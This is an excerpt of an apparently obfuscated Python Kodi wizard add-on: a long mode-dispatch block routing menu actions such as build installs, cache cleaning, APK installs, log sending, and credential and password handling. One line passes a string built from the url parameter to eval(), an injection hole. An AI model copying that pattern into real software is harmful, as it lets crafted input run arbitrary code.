		if OO00OO0OO0O000OOO =='50'and KODIV >=17 and SKIN =='skin.estuary':OO00OO0OO0O000OOO ='55'#line:5584
		if OO00OO0OO0O000OOO =='500'and KODIV >=17 and SKIN =='skin.estuary':OO00OO0OO0O000OOO ='50'#line:5585
		wiz .ebi ("Container.SetViewMode(%s)"%OO00OO0OO0O000OOO )#line:5586
if mode ==None :index ()#line:5588
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5590
elif mode =='builds':buildMenu ()#line:5591
elif mode =='viewbuild':viewBuild (name )#line:5592
elif mode =='buildinfo':buildInfo (name )#line:5593
elif mode =='buildpreview':buildVideo (name )#line:5594
elif mode =='install':buildWizard (name ,url )#line:5595
elif mode =='theme':buildWizard (name ,mode ,url )#line:5596
elif mode =='viewthirdparty':viewThirdList (name )#line:5597
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5598
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5599
elif mode =='maint':maintMenu (name )#line:5601
elif mode =='passpin':passandpin ()#line:5602
elif mode =='backmyupbuild':backmyupbuild ()#line:5603
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5604
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5605
elif mode =='advancedsetting':advancedWindow (name )#line:5606
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5607
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5608
elif mode =='asciicheck':wiz .asciiCheck ()#line:5609
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5610
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5611
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5612
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5613
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5614
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5615
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5616
elif mode =='currentsettings':viewAdvanced ()#line:5617
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5618
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5619
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5620
elif mode =='fixskin':backtokodi ()#line:5621
elif mode =='testcommand':testcommand ()#line:5622
elif mode =='logsend':logsend ()#line:5623
elif mode =='rdon':rdon ()#line:5624
elif mode =='rdoff':rdoff ()#line:5625
elif mode =='setrd':setrealdebrid ()#line:5626
elif mode =='setrd2':setautorealdebrid ()#line:5627
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5628
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5629
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5630
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5631
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5632
elif mode =='freshstart':freshStart ()#line:5633
elif mode =='forceupdate':wiz .forceUpdate ()#line:5634
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5635
elif mode =='forceclose':wiz .killxbmc ()#line:5636
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5637
elif mode =='hidepassword':wiz .hidePassword ()#line:5638
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5639
elif mode =='enableaddons':enableAddons ()#line:5640
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5641
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5642
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5643
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5644
elif mode =='uploadlog':uploadLog .Main ()#line:5645
elif mode =='viewlog':LogViewer ()#line:5646
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5647
elif mode =='viewerrorlog':errorChecking (all =True )#line:5648
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5649
elif mode =='purgedb':purgeDb ()#line:5650
elif mode =='fixaddonupdate':fixUpdate ()#line:5651
elif mode =='removeaddons':removeAddonMenu ()#line:5652
elif mode =='removeaddon':removeAddon (name )#line:5653
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5654
elif mode =='removedata':removeAddonData (name )#line:5655
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5656
elif mode =='systeminfo':systemInfo ()#line:5657
elif mode =='restorezip':restoreit ('build')#line:5658
elif mode =='restoregui':restoreit ('gui')#line:5659
elif mode =='restoreaddon':restoreit ('addondata')#line:5660
elif mode =='restoreextzip':restoreextit ('build')#line:5661
elif mode =='restoreextgui':restoreextit ('gui')#line:5662
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5663
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5664
elif mode =='traktsync':traktsync ()#line:5665
elif mode =='apk':apkMenu (name )#line:5667
elif mode =='apkscrape':apkScraper (name )#line:5668
elif mode =='apkinstall':apkInstaller (name ,url )#line:5669
elif mode =='speed':speedMenu ()#line:5670
elif mode =='net':net_tools ()#line:5671
elif mode =='GetList':GetList (url )#line:5672
elif mode =='youtube':youtubeMenu (name )#line:5673
elif mode =='viewVideo':playVideo (url )#line:5674
elif mode =='addons':addonMenu (name )#line:5676
elif mode =='addoninstall':addonInstaller (name ,url )#line:5677
elif mode =='savedata':saveMenu ()#line:5679
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5680
elif mode =='managedata':manageSaveData (name )#line:5681
elif mode =='whitelist':wiz .whiteList (name )#line:5682
elif mode =='trakt':traktMenu ()#line:5684
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5685
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5686
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5687
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5688
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5689
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5690
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5691
elif mode =='realdebrid':realMenu ()#line:5693
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5694
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5695
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5696
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5697
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5698
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5699
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5700
elif mode =='login':loginMenu ()#line:5702
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5703
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5704
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5705
elif mode =='clearlogin':loginit .clearSaved (name )#line:5706
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5707
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5708
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5709
elif mode =='contact':notify .contact (CONTACT )#line:5711
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5712
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5713
elif mode =='developer':developer ()#line:5715
elif mode =='converttext':wiz .convertText ()#line:5716
elif mode =='createqr':wiz .createQR ()#line:5717
elif mode =='testnotify':testnotify ()#line:5718
elif mode =='testnotify2':testnotify2 ()#line:5719
elif mode =='servicemanual':servicemanual ()#line:5720
elif mode =='fastinstall':fastinstall ()#line:5721
elif mode =='testupdate':testupdate ()#line:5722
elif mode =='testfirst':testfirst ()#line:5723
elif mode =='testfirstrun':testfirstRun ()#line:5724
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5725
elif mode =='bg':wiz .bg_install (name ,url )#line:5727
elif mode =='bgcustom':wiz .bg_custom ()#line:5728
elif mode =='bgremove':wiz .bg_remove ()#line:5729
elif mode =='bgdefault':wiz .bg_default ()#line:5730
elif mode =='rdset':rdsetup ()#line:5731
elif mode =='mor':morsetup ()#line:5732
elif mode =='mor2':morsetup2 ()#line:5733
elif mode =='resolveurl':resolveurlsetup ()#line:5734
elif mode =='urlresolver':urlresolversetup ()#line:5735
elif mode =='forcefastupdate':forcefastupdate ()#line:5736
elif mode =='traktset':traktsetup ()#line:5737
elif mode =='placentaset':placentasetup ()#line:5738
elif mode =='flixnetset':flixnetsetup ()#line:5739
elif mode =='reptiliaset':reptiliasetup ()#line:5740
elif mode =='yodasset':yodasetup ()#line:5741
elif mode =='numbersset':numberssetup ()#line:5742
elif mode =='uranusset':uranussetup ()#line:5743
elif mode =='genesisset':genesissetup ()#line:5744
elif mode =='fastupdate':fastupdate ()#line:5745
elif mode =='folderback':folderback ()#line:5746
elif mode =='menudata':Menu ()#line:5747
elif mode ==2 :#line:5749
        wiz .torent_menu ()#line:5750
elif mode ==3 :#line:5751
        wiz .popcorn_menu ()#line:5752
elif mode ==8 :#line:5753
        wiz .metaliq_fix ()#line:5754
elif mode ==9 :#line:5755
        wiz .quasar_menu ()#line:5756
elif mode ==5 :#line:5757
        swapSkins ('skin.Premium.mod')#line:5758
elif mode ==13 :#line:5759
        wiz .elementum_menu ()#line:5760
elif mode ==16 :#line:5761
        wiz .fix_wizard ()#line:5762
elif mode ==17 :#line:5763
        wiz .last_play ()#line:5764
elif mode ==18 :#line:5765
        wiz .normal_metalliq ()#line:5766
elif mode ==19 :#line:5767
        wiz .fast_metalliq ()#line:5768
elif mode ==20 :#line:5769
        wiz .fix_buffer2 ()#line:5770
elif mode ==21 :#line:5771
        wiz .fix_buffer3 ()#line:5772
elif mode ==11 :#line:5773
        wiz .fix_buffer ()#line:5774
elif mode ==15 :#line:5775
        wiz .fix_font ()#line:5776
elif mode ==14 :#line:5777
        wiz .clean_pass ()#line:5778
elif mode ==22 :#line:5779
        wiz .movie_update ()#line:5780
elif mode =='adv_settings':buffer1 ()#line:5781
elif mode =='getpass':getpass ()#line:5782
elif mode =='setpass':setpass ()#line:5783
elif mode =='setuname':setuname ()#line:5784
elif mode =='passandUsername':passandUsername ()#line:5785
elif mode =='9':disply_hwr ()#line:5786
elif mode =='99':disply_hwr2 ()#line:5787
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))